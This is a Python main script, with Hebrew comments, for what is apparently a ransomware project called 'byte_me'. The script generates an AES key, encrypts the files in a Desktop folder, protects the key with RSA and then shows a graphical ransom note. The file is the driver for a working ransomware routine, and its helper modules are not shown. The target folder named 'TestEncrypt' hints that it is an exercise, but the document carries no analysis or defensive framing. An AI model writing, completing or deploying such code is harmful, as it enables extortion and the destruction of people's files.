#!/usr/bin/env python3

import os
from Crypto.Random import get_random_bytes
from byte_me.encrypt import encrypt_files
from byte_me.decrypt import decrypt_files
from byte_me.ransom_gui import show_ransom_note
from byte_me.utils import encrypt_key_rsa, decrypt_key_rsa, log_action

def main():
    # יצירת מפתח AES אקראי (256-bit)
    key = get_random_bytes(32)
    log_action("Generated AES key")
    print("🔐 Original AES key:", key.hex())

    # הגדרת תיקיית היעד
    target_folder = os.path.expanduser("~/Desktop/TestEncrypt")
    if not os.path.isdir(target_folder):
        print(f"Folder '{target_folder}' not found.")
        return

    # הצפנת קבצים
    encrypt_files(key, folder=target_folder)
    log_action("Files encrypted")

    # הצפנת מפתח ה-AES באמצעות RSA ושמירתו
    encrypt_key_rsa(key)
    log_action("AES key encrypted with RSA")

    # הצגת דרישת כופר גרפית
    show_ransom_note()

if __name__ == "__main__":
    main()

